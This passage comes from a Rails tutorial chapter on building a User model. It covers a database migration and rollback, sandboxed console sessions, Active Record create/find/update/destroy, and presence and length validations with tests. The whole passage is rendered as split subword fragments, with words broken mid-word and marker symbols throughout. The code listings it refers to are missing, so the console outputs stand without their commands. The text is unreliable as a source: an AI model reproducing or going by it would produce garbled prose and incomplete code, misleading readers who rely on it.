▁Here ▁the ▁table ▁name ▁is ▁plural ▁(\ k ode { users }) ▁even ▁though ▁the ▁model ▁name ▁is ▁singular ▁( User ), ▁which ▁reflect s ▁a ▁ l ing u ist ic ▁convention ▁followed ▁by ▁Rails : ▁a ▁model ▁represent s ▁a ▁single ▁user , ▁whereas ▁a ▁database ▁table ▁consist s ▁of ▁many ▁users .
▁( We ' ll ▁see ▁concrete ▁examples ▁of ▁the ▁magic ▁columns ▁starting ▁in ▁Section ~\ ref { sec : creating _ user _ objects }. )
▁The ▁full ▁data ▁model ▁represent ed ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : users _ migration } ▁is ▁show n ▁in ▁F igure ~\ ref { fig : user _ model _ initial }.
▁( Note ▁the ▁addition ▁of ▁the ▁magic ▁columns , ▁which ▁were n ' t ▁present ▁in ▁the ▁sketch ▁show n ▁in ▁F igure ~\ ref { fig : user _ model _ s k et ch }. )
▁The ▁User ▁data ▁model ▁produce d ▁by ▁Listing ~\ ref { code : users _ migration }.
▁( You ▁may ▁recall ▁that ▁we ▁ ra n ▁this ▁command ▁in ▁a ▁similar ▁context ▁in ▁Section ~\ ref { sec : demo _ users _ resource }. )
▁Of fi cial ly ▁ pronoun c ed ▁`` es s - c ue - e ll - ite '' , ▁although ▁the ▁( m is ) p r on un ci ation ▁`` s equ el - ite '' ▁is ▁also ▁common .
▁( If ▁you ' re ▁using ▁the ▁cloud ▁IDE , ▁you ▁should ▁first ▁ download ▁the ▁database ▁file ▁to ▁the ▁local ▁d is k , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : sqlite _ download }. )
▁You ▁m ight ▁note ▁that ▁there ' s ▁one ▁column ▁in ▁F igure ~\ ref { fig : sqlite _ database _ browser } ▁not ▁account ed ▁for ▁in ▁the ▁migration : ▁the ▁\ k ode { id } ▁column .
▁As ▁noted ▁brief ly ▁in ▁Section ~\ ref { sec : demo _ users _ resource }, ▁this ▁column ▁is ▁created ▁automatically , ▁and ▁is ▁used ▁by ▁Rails ▁to ▁identify ▁each ▁row ▁unique ly .
▁The ▁\ href { http :// sqlite browser . org /}{ D B ▁B row s er ▁for ▁SQLite } ▁with ▁our ▁new ▁\ k ode { users } ▁table .
▁ Most ▁migrations ▁( including ▁all ▁the ▁one s ▁in ▁this ▁tutorial ) ▁are ▁\ emph { reversible }, ▁which ▁means ▁we ▁can ▁`` migrate ▁down '' ▁and ▁undo ▁them ▁with ▁a ▁single ▁Rake ▁task , ▁called ▁\ k ode { db : rollback } :
▁ $ ▁bundle ▁exec ▁rake ▁db : rollback
▁Under ▁the ▁hood , ▁this ▁command ▁execute s ▁the ▁\ k ode { drop \_ table } ▁command ▁to ▁remove ▁the ▁users ▁table ▁from ▁the ▁database .
▁The ▁reason ▁this ▁works ▁is ▁that ▁the ▁\ k ode { change } ▁method ▁know s ▁that ▁\ k ode { drop \_ table } ▁is ▁the ▁inverse ▁of ▁\ k ode { create \_ table }, ▁which ▁means ▁that ▁the ▁ rollback ▁migration ▁can ▁be ▁easily ▁inferred .
▁In ▁the ▁case ▁of ▁an ▁ ir reversible ▁migration , ▁such ▁as ▁one ▁to ▁remove ▁a ▁database ▁column , ▁it ▁is ▁necessary ▁to ▁define ▁separate ▁\ k ode { up } ▁and ▁\ k ode { d own } ▁methods ▁in ▁place ▁of ▁the ▁single ▁\ k ode { change } ▁method .
▁Read ▁about ▁\ href { http :// guides . rubyonrails . org / migrations . html }{ migrations ▁in ▁the ▁Rails ▁G u id es } ▁for ▁more ▁information .
▁If ▁you ▁roll ed ▁back ▁the ▁database , ▁ migrate ▁up ▁again ▁before ▁proceeding :
▁We ' ve ▁seen ▁how ▁the ▁User ▁model ▁generation ▁in ▁Listing ~\ ref { code : generate _ user _ model } ▁generated ▁a ▁migration ▁file ▁( Listing ~\ ref { code : users _ migration }), ▁and ▁we ▁saw ▁in ▁F igure ~\ ref { fig : sqlite _ database _ browser } ▁the ▁results ▁of ▁running ▁this ▁migration : ▁it ▁updated ▁a ▁file ▁called ▁\ k ode { development . sqlite 3 } ▁by ▁creating ▁a ▁table ▁\ k ode { users } ▁with ▁columns ▁\ k ode { id }, ▁\ k ode { name }, ▁\ k ode { email }, ▁\ k ode { created \_ at }, ▁and ▁\ k ode { updated \_ at }.
▁Listing ~\ ref { code : generate _ user _ model } ▁also ▁created ▁the ▁model ▁itself .
▁The ▁rest ▁of ▁this ▁section ▁is ▁d ed icated ▁to ▁understanding ▁it .
▁It ▁is , ▁to ▁put ▁it ▁m il d ly , ▁very ▁compact ▁( Listing ~\ ref { code : raw _ user _ model }).
▁The ▁ br and ▁new ▁User ▁model .
▁As ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby }, ▁our ▁tool ▁of ▁choice ▁for ▁explor ing ▁data ▁models ▁is ▁the ▁Rails ▁console .
▁S ince ▁we ▁don ' t ▁( y et ) ▁want ▁to ▁make ▁any ▁changes ▁to ▁our ▁database , ▁we ' ll ▁start ▁the ▁console ▁in ▁a ▁\ emph { sandbox } :
▁ $ ▁rails ▁console ▁-- sandbox
▁Load ing ▁development ▁environment ▁in ▁ sandbox
▁Any ▁modification s ▁you ▁make ▁will ▁be ▁roll ed ▁back ▁on ▁exit
▁As ▁indicate d ▁by ▁the ▁helpful ▁message ▁`` A n y ▁modification s ▁you ▁make ▁will ▁be ▁roll ed ▁back ▁on ▁exit '' , ▁when ▁started ▁in ▁a ▁ sandbox ▁the ▁console ▁will ▁`` r o ll ▁back '' ▁( i . e . , ▁undo ) ▁any ▁database ▁changes ▁introduce d ▁during ▁the ▁session .
▁In ▁the ▁console ▁session ▁in ▁Section ~\ ref { sec : a _ user _ class }, ▁we ▁created ▁a ▁new ▁user ▁object ▁with ▁\ k ode { User . new }, ▁which ▁we ▁ha d ▁access ▁to ▁only ▁after ▁requiring ▁the ▁example ▁user ▁file ▁in ▁Listing ~\ ref { code : example _ user }.
▁With ▁models , ▁the ▁situation ▁is ▁different ; ▁as ▁you ▁may ▁recall ▁from ▁Section ~\ ref { sec : a _ controller _ class }, ▁the ▁Rails ▁console ▁automatically ▁load s ▁the ▁Rails ▁environment , ▁which ▁includes ▁the ▁models .
▁This ▁means ▁that ▁we ▁can ▁make ▁a ▁new ▁user ▁object ▁without ▁any ▁further ▁work :
▁=> ▁#< User ▁id : ▁nil , ▁name : ▁nil , ▁email : ▁nil , ▁created _ at : ▁nil , ▁updated _ at : ▁nil >
▁We ▁see ▁here ▁the ▁default ▁console ▁representation ▁of ▁a ▁user ▁object .
▁When ▁called ▁with ▁no ▁arguments , ▁\ k ode { User . new } ▁returns ▁an ▁object ▁with ▁all ▁\ k ode { nil } ▁attributes .
▁In ▁Section ~\ ref { sec : a _ user _ class }, ▁we ▁design ed ▁the ▁example ▁User ▁class ▁to ▁take ▁an ▁\ emph { i nitialization ▁hash } ▁to ▁set ▁the ▁object ▁attributes ; ▁that ▁design ▁choice ▁was ▁motivate d ▁by ▁Active ▁Record , ▁which ▁allows ▁objects ▁to ▁be ▁initialize d ▁in ▁the ▁same ▁way :
▁=> ▁#< User ▁id : ▁nil , ▁name : ▁" Michael ▁Hartl ", ▁email : ▁" mhartl @ example . com ",
▁created _ at : ▁nil , ▁updated _ at : ▁nil >
▁Here ▁we ▁see ▁that ▁the ▁name ▁and ▁email ▁attributes ▁have ▁been ▁set ▁as ▁expected .
▁The ▁not ion ▁of ▁\ emph { validity } ▁is ▁important ▁for ▁understanding ▁Active ▁Record ▁model ▁objects .
▁We ' ll ▁explor e ▁this ▁subject ▁in ▁more ▁depth ▁in ▁Section ~\ ref { sec : user _ validations }, ▁but ▁for ▁now ▁it ' s ▁worth ▁noting ▁that ▁our ▁initial ▁\ k ode { user } ▁object ▁is ▁valid , ▁which ▁we ▁can ▁verify ▁by ▁calling ▁the ▁boolean ▁\ k ode { valid ?}\ ▁method ▁on ▁it :
▁So ▁far , ▁we ▁have n ' t ▁ touch ed ▁the ▁database : ▁\ k ode { User . new } ▁only ▁creates ▁an ▁object ▁\ emph { in ▁memory }, ▁while ▁\ k ode { user . valid ?}\ ▁me re ly ▁check s ▁to ▁see ▁if ▁the ▁object ▁is ▁valid .
▁In ▁order ▁to ▁save ▁the ▁User ▁object ▁to ▁the ▁database , ▁we ▁need ▁to ▁call ▁the ▁\ k ode { save } ▁method ▁on ▁the ▁\ k ode { user } ▁variable :
▁The ▁\ k ode { save } ▁method ▁returns ▁\ k ode { true } ▁if ▁it ▁succeed s ▁and ▁\ k ode { false } ▁otherwise .
▁( C ur r ent ly , ▁all ▁save s ▁should ▁succeed ▁because ▁there ▁are ▁as ▁yet ▁no ▁validations ; ▁we ' ll ▁see ▁cases ▁in ▁Section ~\ ref { sec : user _ validations } ▁when ▁some ▁will ▁fail .)
▁The ▁only ▁exception ▁is ▁in ▁Section ~\ ref { sec : scope s _ subselect s _ and _ a _ lambda }.
▁You ▁may ▁have ▁notice d ▁that ▁the ▁new ▁user ▁object ▁ha d ▁\ k ode { nil } ▁values ▁for ▁the ▁\ k ode { id } ▁and ▁the ▁magic ▁columns ▁\ k ode { created \_ at } ▁and ▁\ k ode { updated \_ at } ▁attributes .
▁Let ' s ▁see ▁if ▁our ▁\ k ode { save } ▁changed ▁anything :
▁=> ▁#< User ▁id : ▁1, ▁name : ▁" Michael ▁Hartl ", ▁email : ▁" mhartl @ example . com ",
▁In ▁case ▁you ' re ▁curious ▁about ▁\ k ode {" 20 1 4 - 07 - 2 4 ▁00:57:46" }, ▁I ' m ▁not ▁writing ▁this ▁after ▁ midnight ; ▁the ▁timestamp s ▁are ▁record ed ▁in ▁\ href { http :// en . wiki p edia . org / wiki / Co or d in at ed _ U n ivers al _ Time }{ Co or d in at ed ▁Un ivers al ▁Time } ▁( UT C ), ▁which ▁for ▁most ▁practical ▁purposes ▁is ▁the ▁same ▁as ▁\ href { http :// en . wiki p edia . org / wiki / G re en w ic h _ M e an _ Time }{ G re en w ic h ▁M e an ▁Time }.
▁The ▁I T U ▁f el t ▁it ▁was ▁best ▁to ▁design ate ▁a ▁single ▁a b br evi ation ▁for ▁use ▁in ▁all ▁languages ▁in ▁order ▁to ▁ mini m ize ▁confusion .
▁S ince ▁un an i m ous ▁a g re e ment ▁could ▁not ▁be ▁achieve d ▁on ▁using ▁either ▁the ▁English ▁word ▁order , ▁C UT , ▁or ▁the ▁F re n ch ▁word ▁order , ▁T U C , ▁the ▁ acronym ▁UTC ▁was ▁chose n ▁as ▁a ▁compromise .
▁As ▁with ▁the ▁User ▁class ▁in ▁Section ~\ ref { sec : a _ user _ class }, ▁instance s ▁of ▁the ▁User ▁model ▁allow ▁access ▁to ▁their ▁attributes ▁using ▁a ▁do t ▁notation :
▁=> ▁" Michael ▁Hartl "
▁=> ▁" mhartl @ example . com "
▁As ▁we ' ll ▁see ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁it ' s ▁often ▁convenient ▁to ▁make ▁and ▁save ▁a ▁model ▁in ▁two ▁steps ▁as ▁we ▁have ▁above , ▁but ▁Active ▁Record ▁also ▁let s ▁you ▁combine ▁them ▁into ▁one ▁step ▁with ▁\ k ode { User . create } :
▁#< User ▁id : ▁2, ▁name : ▁" A ▁N other ", ▁email : ▁" another @ example . org ", ▁created _ at :
▁Note ▁that ▁\ k ode { User . create }, ▁rather ▁than ▁return ing ▁\ k ode { true } ▁or ▁\ k ode { false }, ▁returns ▁the ▁User ▁object ▁itself , ▁which ▁we ▁can ▁optional ly ▁assign ▁to ▁a ▁variable ▁( such ▁as ▁\ k ode { foo } ▁in ▁the ▁second ▁command ▁above ).
▁The ▁inverse ▁of ▁\ k ode { create } ▁is ▁\ k ode { destroy } :
▁Like ▁\ k ode { create }, ▁\ k ode { destroy } ▁returns ▁the ▁object ▁in ▁question , ▁though ▁I ▁can ' t ▁recall ▁ever ▁ having ▁used ▁the ▁return ▁value ▁of ▁\ k ode { destroy }.
▁In ▁addition , ▁the ▁destroyed ▁object ▁ still ▁exists ▁in ▁memory :
▁So ▁how ▁do ▁we ▁know ▁if ▁we ▁really ▁destroyed ▁an ▁object ?
▁And ▁for ▁saved ▁and ▁non - destroy ed ▁objects , ▁how ▁can ▁we ▁retrieve ▁users ▁from ▁the ▁database ?
▁To ▁an s w er ▁these ▁question s , ▁we ▁need ▁to ▁learn ▁how ▁to ▁use ▁Active ▁Record ▁to ▁find ▁user ▁objects .
▁Active ▁Record ▁provides ▁sever al ▁options ▁for ▁find ing ▁objects .
▁Let ' s ▁use ▁them ▁to ▁find ▁the ▁first ▁user ▁we ▁created ▁while ▁verify ing ▁that ▁the ▁third ▁user ▁(\ k ode { foo }) ▁has ▁been ▁destroyed .
▁We ' ll ▁start ▁with ▁the ▁existing ▁user :
▁Here ▁we ' ve ▁passed ▁the ▁id ▁of ▁the ▁user ▁to ▁\ k ode { User . find } ; ▁Active ▁Record ▁returns ▁the ▁user ▁with ▁that ~ id .
▁Let ' s ▁see ▁if ▁the ▁user ▁with ▁an ▁\ k ode { id } ▁of ~\ k ode { 3 } ▁ still ▁exists ▁in ▁the ▁database :
▁ActiveRecord :: RecordNotFound : ▁Co ul d n ' t ▁find ▁User ▁with ▁ ID = 3
▁S ince ▁we ▁destroyed ▁our ▁third ▁user ▁in ▁Section ~\ ref { sec : creating _ user _ objects }, ▁Active ▁Record ▁can ' t ▁find ▁it ▁in ▁the ▁database .
▁E xception s ▁and ▁exception ▁handling ▁are ▁some what ▁advanced ▁Ruby ▁subject s , ▁and ▁we ▁won ' t ▁need ▁them ▁much ▁in ▁this ▁book .
▁They ▁are ▁important , ▁though , ▁and ▁I ▁suggest ▁learning ▁about ▁them ▁using ▁one ▁of ▁the ▁Ruby ▁book s ▁recommended ▁in ▁Section ~\ ref { sec : guid e _ to _ f urther _ resources }.
▁In ▁addition ▁to ▁the ▁generic ▁\ k ode { find }, ▁Active ▁Record ▁also ▁allows ▁us ▁to ▁find ▁users ▁by ▁specific ▁attributes :
▁S ince ▁we ▁will ▁be ▁using ▁email ▁addresses ▁as ▁username s , ▁this ▁sort ▁of ▁\ k ode { find } ▁will ▁be ▁useful ▁when ▁we ▁learn ▁how ▁to ▁let ▁users ▁log ▁in ▁to ▁our ▁site ▁( Chapter ~\ ref { cha : sign _ up }).
▁If ▁you ' re ▁ w or r i ed ▁that ▁\ k ode { find \_ by } ▁will ▁be ▁in efficient ▁if ▁there ▁are ▁a ▁large ▁number ▁of ▁users , ▁you ' re ▁a head ▁of ▁the ▁game ; ▁we ' ll ▁cover ▁this ▁issue , ▁and ▁its ▁solution ▁via ▁database ▁indices , ▁in ▁Section ~\ ref { sec : uniqueness _ validation }.
▁We ' ll ▁end ▁with ▁a ▁couple ▁of ▁more ▁general ▁ways ▁of ▁find ing ▁users .
▁First , ▁there ' s ▁\ k ode { first } :
▁N at ur ally , ▁\ k ode { first } ▁just ▁returns ▁the ▁first ▁user ▁in ▁the ▁database .
▁There ' s ▁also ▁\ k ode { all } :
▁#< User ▁id : ▁2, ▁name : ▁" A ▁N other ", < n > email : ▁" another @ example . org ", ▁created _ at :
▁On ce ▁we ' ve ▁created ▁objects , ▁we ▁often ▁want ▁to ▁update ▁them .
▁There ▁are ▁two ▁basic ▁ways ▁to ▁do ▁this .
▁First , ▁we ▁can ▁assign ▁attributes ▁individual ly , ▁as ▁we ▁did ▁in ▁Section ~\ ref { sec : a _ user _ class } :
▁=> ▁" mhartl @ example . net "
▁Note ▁that ▁the ▁final ▁step ▁is ▁necessary ▁to ▁write ▁the ▁changes ▁to ▁the ▁database .
▁We ▁can ▁see ▁what ▁happens ▁without ▁a ▁save ▁by ▁using ▁\ k ode { reload }, ▁which ▁reload s ▁the ▁object ▁base d ▁on ▁the ▁database ▁information :
▁=> ▁" foo @ bar . com "
▁The ▁\ k ode { update \_ attributes } ▁method ▁is ▁an ▁alias ▁for ▁the ▁short er ▁\ k ode { update } ▁method , ▁but ▁I ▁prefer ▁the ▁longer ▁version ▁because ▁of ▁its ▁similar ity ▁to ▁the ▁singular ▁version ▁of ▁the ▁method , ▁\ k ode { update \_ attribute }.
▁=> ▁" The ▁D u de "
▁=> ▁" dude @ a b id es . org "
▁The ▁\ k ode { update \_ attributes } ▁method ▁accept s ▁a ▁hash ▁of ▁attributes , ▁and ▁on ▁ success ▁perform s ▁both ▁the ▁update ▁and ▁the ▁save ▁in ▁one ▁step ▁( return ing ▁\ k ode { true } ▁to ▁indicate ▁that ▁the ▁save ▁we n t ▁through ).
▁Note ▁that ▁if ▁any ▁of ▁the ▁validations ▁fail , ▁such ▁as ▁when ▁a ▁password ▁is ▁required ▁to ▁save ▁a ▁record ▁( as ▁implemented ▁in ▁Section ~\ ref { sec : adding _ a _ secure _ password }), ▁the ▁call ▁to ▁\ k ode { update \_ attributes } ▁will ▁fail .
▁If ▁we ▁need ▁to ▁update ▁only ▁a ▁single ▁attribute , ▁using ▁the ▁singular ▁\ k ode { update \_ attribute } ▁bypass es ▁this ▁restrict ion :
▁The ▁User ▁model ▁we ▁created ▁in ▁Section ~\ ref { sec : user _ model } ▁now ▁has ▁working ▁\ k ode { name } ▁and ▁\ k ode { email } ▁attributes , ▁but ▁they ▁are ▁completely ▁generic : ▁any ▁string ▁( including ▁an ▁empty ▁one ) ▁is ▁current ly ▁valid ▁in ▁either ▁case .
▁And ▁yet , ▁names ▁and ▁email ▁addresses ▁are ▁more ▁specific ▁than ▁this .
▁For ▁example , ▁\ k ode { name } ▁should ▁be ▁non - blank , ▁and ▁\ k ode { email } ▁should ▁match ▁the ▁specific ▁format ▁character ist ic ▁of ▁email ▁addresses .
▁More over , ▁since ▁we ' ll ▁be ▁using ▁email ▁addresses ▁as ▁unique ▁username s ▁when ▁users ▁log ▁in , ▁we ▁should n ' t ▁allow ▁email ▁duplicate s ▁in ▁the ▁database .
▁In ▁short , ▁we ▁should n ' t ▁allow ▁\ k ode { name } ▁and ▁\ k ode { email } ▁to ▁be ▁just ▁any ▁strings ; ▁we ▁should ▁enforce ▁certain ▁constraints ▁on ▁their ▁values .
▁Active ▁Record ▁allows ▁us ▁to ▁i mp o se ▁such ▁constraints ▁using ▁\ emph { validations } ▁( see n ▁brief ly ▁before ▁in ▁Section ~\ ref { sec : putting _ the _ micro _ in _ microposts }).
▁In ▁this ▁section , ▁we ' ll ▁cover ▁sever al ▁of ▁the ▁most ▁common ▁cases , ▁valid at ing ▁\ emph { presence }, ▁\ emph { length }, ▁\ emph { format } ▁and ▁\ emph { uniqueness }.
▁In ▁Section ~\ ref { sec : has _ secure _ password } ▁we ' ll ▁add ▁a ▁final ▁common ▁validation , ▁\ emph { confirmation }.
▁And ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : unsuccessful _ signup s } ▁how ▁validations ▁give ▁us ▁convenient ▁error ▁messages ▁when ▁users ▁make ▁submission s ▁that ▁violat e ▁them .
▁< n >< n >\ subsection { A ▁validity ▁test } ▁% ▁( fold )< n >\ label { sec : a _ validity _ test }< n >< n > As ▁noted ▁in ▁Bo x ~\ ref { aside : when _ to _ test }, ▁test - driven ▁development ▁is n ' t ▁always ▁the ▁right ▁tool ▁for ▁the ▁job , ▁but ▁model ▁validations ▁are ▁exactly ▁the ▁kind ▁of ▁features ▁for ▁which ▁ TDD ▁is ▁a ▁ perfect ▁fit .
▁It ' s ▁difficult ▁to ▁be ▁confident ▁that ▁a ▁given ▁validation ▁is ▁doing ▁exactly ▁what ▁we ▁expect ▁it ▁to ▁without ▁writing ▁a ▁failing ▁test ▁and ▁the n ▁getting ▁it ▁to ▁pass .
▁Ou r ▁method ▁will ▁be ▁to ▁start ▁with ▁a ▁\ emph { valid } ▁model ▁object , ▁set ▁one ▁of ▁its ▁attributes ▁to ▁something ▁we ▁want ▁to ▁be ▁invalid , ▁and ▁the n ▁test ▁that ▁it ▁in ▁fact ▁is ▁invalid .
▁As ▁a ▁ safety ▁ net , ▁we ' ll ▁first ▁write ▁a ▁test ▁to ▁make ▁sure ▁the ▁initial ▁model ▁object ▁is ▁valid .
▁This ▁way , ▁when ▁the ▁validation ▁tests ▁fail ▁we ' ll ▁know ▁it ' s ▁for ▁the ▁right ▁reason ▁( and ▁not ▁because ▁the ▁initial ▁object ▁was ▁invalid ▁in ▁the ▁first ▁place ).
▁To ▁get ▁us ▁started , ▁the ▁command ▁in ▁Listing ~\ ref { code : generate _ user _ model } ▁produce d ▁an ▁initial ▁test ▁for ▁testing ▁users , ▁though ▁in ▁this ▁case ▁it ' s ▁practical ly ▁blank ▁( Listing ~\ ref { code : default _ user _ test }).
▁The ▁practical ly ▁blank ▁default ▁User ▁test .
▁To ▁write ▁a ▁test ▁for ▁a ▁valid ▁object , ▁we ' ll ▁create ▁an ▁initially ▁valid ▁User ▁model ▁object ▁\ k ode {@ user } ▁using ▁the ▁special ▁\ k ode { setup } ▁method ▁( discusse d ▁brief ly ▁in ▁the ▁Chapter ~\ ref { cha : static _ pages } ▁ exercises ), ▁which ▁automatically ▁get s ▁run ▁before ▁each ▁test . ▁Because ▁\ k ode {@ user } ▁is ▁an ▁instance ▁variable , ▁it ' s ▁automatically ▁available ▁in ▁all ▁the ▁tests , ▁and ▁we ▁can ▁test ▁its ▁validity ▁using ▁the ▁\ k ode { valid ?}\ ▁method ▁( Section ~\ ref { sec : creating _ user _ objects }).
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : valid _ user _ test }
▁A ▁test ▁for ▁an ▁initially ▁valid ▁user .
▁Listing ~\ ref { code : valid _ user _ test } ▁uses ▁the ▁plain ▁\ k ode { assert } ▁method , ▁which ▁in ▁this ▁case ▁succeed s ▁if ▁\ k ode {@ user . valid ? } ▁returns ▁\ k ode { true } ▁and ▁fails ▁if ▁it ▁returns ▁\ k ode { false }.
▁Because ▁our ▁User ▁model ▁does n ' t ▁current ly ▁have ▁any ▁validations , ▁the ▁initial ▁test ▁should ▁pass :
▁Here ▁we ' ve ▁used ▁\ k ode { rake ▁test : models } ▁to ▁run ▁just ▁the ▁model ▁tests ▁( com p a re ▁to ▁\ k ode { rake ▁test : integration } ▁from ▁Section ~\ ref { sec : layout _ link _ tests }).
▁P erhaps ▁the ▁most ▁element ary ▁validation ▁is ▁\ emph { presence }, ▁which ▁simply ▁verifie s ▁that ▁a ▁given ▁attribute ▁is ▁present .
▁For ▁example , ▁in ▁this ▁section ▁we ' ll ▁ensure ▁that ▁both ▁the ▁name ▁and ▁email ▁fields ▁are ▁present ▁before ▁a ▁user ▁get s ▁saved ▁to ▁the ▁database .
▁In ▁Section ~\ ref { sec : signup _ error _ messages }, ▁we ' ll ▁see ▁how ▁to ▁pro p a g ate ▁this ▁requirement ▁up ▁to ▁the ▁signup ▁form ▁for ▁creating ▁new ▁users .
▁We ' ll ▁start ▁with ▁a ▁test ▁for ▁the ▁presence ▁of ▁a ▁\ k ode { name } ▁attribute ▁by ▁build ing ▁on ▁the ▁test ▁in ▁Listing ~\ ref { code : valid _ user _ test }.
▁As ▁seen ▁in ▁Listing ~\ ref { code : name _ presence _ test }, ▁all ▁we ▁need ▁to ▁do ▁is ▁set ▁the ▁\ k ode {@ user } ▁variable ' s ▁\ k ode { name } ▁attribute ▁to ▁a ▁blank ▁string ▁( in ▁this ▁case , ▁a ▁string ▁of ▁spaces ) ▁and ▁the n ▁check ▁( using ▁the ▁\ k ode { assert \_ not } ▁method ) ▁that ▁the ▁result ing ▁User ▁object ▁is ▁not ▁valid .
▁A ▁test ▁for ▁validation ▁of ▁the ▁\ k ode { name } ▁attribute .
▁As ▁we ▁saw ▁brief ly ▁before ▁in ▁the ▁Chapter ~\ ref { cha : a _ toy _ app } ▁ exercises , ▁the ▁way ▁to ▁validate ▁the ▁presence ▁of ▁the ▁name ▁attribute ▁is ▁to ▁use ▁the ▁\ k ode { validates } ▁method ▁with ▁argument ▁\ k ode { presence : ▁true }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : validates _ presence _ of _ name }.
▁The ▁\ k ode { presence : ▁true } ▁argument ▁is ▁a ▁one - e le ment ▁\ emph { options ▁hash } ; ▁recall ▁from ▁Section ~\ ref { sec : css _ revisited } ▁that ▁ curl y ▁braces ▁are ▁optional ▁when ▁passing ▁hashes ▁as ▁the ▁final ▁argument ▁in ▁a ▁method .
▁( As ▁noted ▁in ▁Section ~\ ref { sec : adding _ to _ the _ layout }, ▁the ▁use ▁of ▁options ▁hashes ▁is ▁a ▁re c ur r ing ▁the me ▁in ▁Rails .)
▁Validat ing ▁the ▁presence ▁of ▁a ▁\ k ode { name } ▁attribute .
▁Listing ~\ ref { code : validates _ presence _ of _ name } ▁may ▁look ▁like ▁magic , ▁but ▁\ k ode { validates } ▁is ▁just ▁a ▁method .
▁An ▁equivalent ▁form ul ation ▁of ▁Listing ~\ ref { code : validates _ presence _ of _ name } ▁using ▁parentheses ▁is ▁as ▁follows :
▁Let ' s ▁ drop ▁into ▁the ▁console ▁to ▁see ▁the ▁effect s ▁of ▁adding ▁a ▁validation ▁to ▁our ▁User ▁model
▁I ' ll ▁omit ▁the ▁output ▁of ▁console ▁commands ▁when ▁they ▁are ▁not ▁particular ly ▁instruct ive --- for ▁example , ▁the ▁results ▁of ▁\ k ode { User . new }.
▁=> ▁false
▁Here ▁we ▁check ▁the ▁validity ▁of ▁the ▁\ k ode { user } ▁variable ▁using ▁the ▁\ k ode { valid ?}\ ▁method , ▁which ▁returns ▁\ k ode { false } ▁when ▁the ▁object ▁fails ▁one ▁or ▁more ▁validations , ▁and ▁\ k ode { true } ▁when ▁all ▁validations ▁pass .
▁In ▁this ▁case , ▁we ▁only ▁have ▁one ▁validation , ▁so ▁we ▁know ▁which ▁one ▁failed , ▁but ▁it ▁can ▁ still ▁be ▁helpful ▁to ▁check ▁using ▁the ▁\ k ode { errors } ▁object ▁generated ▁on ▁failure :
▁( The ▁error ▁message ▁is ▁a ▁hint ▁that ▁Rails ▁validates ▁the ▁presence ▁of ▁an ▁attribute ▁using ▁the ▁\ k ode { blank ? }
▁method , ▁which ▁we ▁saw ▁at ▁the ▁end ▁of ▁Section ~\ ref { sec : mod ify ing _ built _ in _ classes }. )
▁Because ▁the ▁user ▁is n ' t ▁valid , ▁an ▁attempt ▁to ▁save ▁the ▁user ▁to ▁the ▁database ▁automatically ▁fails :
▁As ▁a ▁result , ▁the ▁test ▁in ▁Listing ~\ ref { code : name _ presence _ test } ▁should ▁now ▁be ▁\ passing :
▁Follow ing ▁the ▁model ▁in ▁Listing ~\ ref { code : name _ presence _ test }, ▁writing ▁a ▁test ▁for ▁\ k ode { email } ▁attribute ▁presence ▁is ▁easy ▁( Listing ~\ ref { code : email _ presence _ test }), ▁as ▁is ▁the ▁application ▁code ▁to ▁get ▁it ▁to ▁pass ▁( Listing ~\ ref { code : validates _ presence _ of _ email }).
▁A ▁test ▁for ▁validation ▁of ▁the ▁\ k ode { email } ▁attribute .
▁Validat ing ▁the ▁presence ▁of ▁an ▁\ k ode { email } ▁attribute .
▁At ▁this ▁point , ▁the ▁presence ▁validations ▁are ▁complete , ▁and ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁We ' ve ▁constrain ed ▁our ▁User ▁model ▁to ▁require ▁a ▁name ▁for ▁each ▁user , ▁but ▁we ▁should ▁go ▁further : ▁the ▁user ' s ▁names ▁will ▁be ▁displayed ▁on ▁the ▁sample ▁site , ▁so ▁we ▁should ▁enforce ▁some ▁limit ▁on ▁their ▁length .
▁With ▁all ▁the ▁work ▁we ▁did ▁in ▁Section ~\ ref { sec : presence _ validation }, ▁this ▁step ▁is ▁easy .
▁There ' s ▁no ▁ science ▁to ▁ pick ing ▁a ▁ maximum ▁length ; ▁we ' ll ▁just ▁pull ~\ k ode { 50 } ▁out ▁of ▁ th in ▁a ir ▁as ▁a ▁reason able ▁upper ▁b ound , ▁which ▁means ▁verify ing ▁that ▁names ▁of ~\ k ode { 5 1 } ▁characters ▁are ▁too ▁long .
▁In ▁addition , ▁although ▁it ' s ▁unlike ly ▁ever ▁to ▁be ▁a ▁problem , ▁there ' s ▁a ▁chance ▁that ▁a ▁user ' s ▁email ▁address ▁could ▁over ru n ▁the ▁ maximum ▁length ▁of ▁strings , ▁which ▁for ▁many ▁database s ▁is ▁2 5 5 .
▁Because ▁the ▁format ▁validation ▁in ▁Section ~\ ref { sec : format _ validation } ▁won ' t ▁enforce ▁such ▁a ▁constraint , ▁we ' ll ▁add ▁one ▁in ▁this ▁section ▁for ▁completeness .
▁Listing ~\ ref { code : length _ validation _ test } ▁shows ▁the ▁result ing ▁tests .
▁A ▁test ▁for ▁\ k ode { name } ▁length ▁validation .
▁For ▁convenience , ▁we ' ve ▁used ▁`` string ▁ multi plication '' ▁in ▁Listing ~\ ref { code : length _ validation _ test } ▁to ▁make ▁a ▁string ▁5 1 ▁characters ▁long .
▁We ▁can ▁see ▁how ▁this ▁works ▁using ▁the ▁console :
▁=> ▁" a aaaaaaaaaa aaaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaaaaaaaaa "
▁=> ▁5 1
▁The ▁email ▁length ▁validation ▁arrange s ▁to ▁make ▁a ▁valid ▁email ▁address ▁that ' s ▁one ▁character ▁too ▁long :
▁=> ▁" a aaaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaaaaaaaaa
▁To ▁get ▁them ▁to ▁pass , ▁we ▁need ▁to ▁use ▁the ▁validation ▁argument ▁to ▁constrain ▁length , ▁which ▁is ▁just ▁\ k ode { length }, ▁along ▁with ▁the ▁\ k ode { maximum } ▁parameter ▁to ▁enforce ▁the ▁upper ▁b ound ▁( Listing ~\ ref { code : length _ validation }).
▁ Adding ▁a ▁length ▁validation ▁for ▁the ▁\ k ode { name } ▁attribute .
▁Now ▁the ▁tests ▁should ▁be ▁\ passing :
